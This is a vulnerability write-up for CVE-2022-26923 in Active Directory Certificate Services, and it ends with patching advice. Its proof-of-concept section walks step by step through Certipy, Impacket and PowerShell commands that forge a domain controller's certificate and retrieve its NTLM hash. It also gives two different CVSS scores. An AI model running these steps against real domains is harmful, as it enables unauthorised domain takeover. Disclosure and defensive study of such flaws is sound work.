# CVE-2022-26923 AD Certificate Services

* **Date of publication** : 10/05/2022  
* Attack complexity: Low
* Privileges required: Low
* **CVSS Score :** <span style='color:red;'>8.1</span>   


The vulnerability allowed a low-privileged user to escalate privileges to domain administrator in a default Active Directory environment with the Active Directory Certificate Services (AD CS) server role installed.

An exploit was developed by Oliver Lyak (ly4k_) in Python and was published before and not after the advisory. It is declared as proof-of-concept. The exploit is available for download at research.ifcr.dk.

**Source :**
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923
- https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
- https://vuldb.com/fr/?id.199368


## Description 
The newly revealed Active Directory Domain privilege escalation flaw hasn’t been yet exploited in the wild, still its high 8.8. CVSS score points to a high risk it poses to the compromised systems enabling attackers to abuse the certificate issues. CVE-2022–26923 allows manipulating the DnsHostName attribute, which specifies the computer name as it is registered in DNS, and then enables an adversary to obtain a certificate from the AD Certificate Services, potentially leading to elevation of privilege.

## POC

        - Username: user_test
        - Password: Password123#
        - Domain: my.domain.com
        
        To reproduce you must: 
        - Have impacket and certipy installed on the attacking machine.
          - https://github.com/SecureAuthCorp/impacket
          - https://github.com/ly4k/Certipy
        - Have compromised a user with low privilege. 
        - A system is vulnerable only if Active Directory Certificate Services is running on the domain.

1. Let's start by generating a certificate for our low privilege AD user (Username=user_test Password=Password123#) using the certificate template User : 
    ````
    certipy req 'my.domain.com/user_test:Password123#@hostname.my.domain.com' -ca MY-DOMAIN-HOSTNAME-CA -template User
    ````
    
2. Let's check that the certificate is valid and that it can be used for Kerberos authentication via Certipy :
    ````
    certipy auth -pfx user_test.pfx
    ````
    
3. Adding a virtual computer to the domain with Impacket
    ````
    addcomputer.py 'my.domain.com/user_test:Password123#' -method LDAPS -computer-name 'NEW_PC' -computer-pass 'Password123#'

    # my.domain.com/user_test:Password123# - We need to provide valid AD credentials in order to add a new computer.
    # method - The method of authentication. LDAPS will interface with the LDAP service on the domain controller.
    # computer-name - The name of our computer. This can be anything we like, as long as it is not the same as an existing computer object.
    # computer-pass - The password associated with our computer's machine account. We will need to impersonate this computer that we create, so make note of the password you chose here.
    ````  
    
4. Let's generate a certificate for the new computer we created. To use the machine account of said computer, you need to add a "$" at the end of the name:
    ````
    certipy req 'my.domain.com/NEW_PC$:Password123#@hostname.my.domain.com' -ca MY-DOMAIN-HOSTNAME-CA -template Machine
    ````
    
5. On the compromised machine, updating the DNS Hostname and SPN Attributes :
    ````
    PS C:\Users\user_test> Get-ADComputer NEW_PC -properties dnshostname,serviceprincipalname
    ````
    
6. Remove our current SPN attribute
    ````
    PS C:\Users\user_test> Set-ADComputer NEW_PC -ServicePrincipalName @{}
    ````
    
7. Try to set the DNS hostname attribute to that of the DC:
    ````
    PS C:\Users\user_test> Set-ADComputer NEW_PC -DnsHostName HOSTANME.my.domain.com
    ````
    
8. On the attacking machine, forging a Malicious Certificate
    ````
    certipy req 'my.domain.com/NEW_PC$:Password123#@hostname.my.domain.com' -ca MY-DOMAIN-HOSTNAME-CA -template Machine
    ````
    
9. Verify that this certificate is working and will return the NTLM hash
    ````
    certipy auth -pfx hostname.pfx
    ````
  
## Mitigations and Fixes

For CVE-2022–26923 mitigation and protective measures, Microsoft strongly recommends updating all servers that run AD Certificate Services and Windows domain controllers operating certificate-based authentication to the latest May 10 version. 

- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923
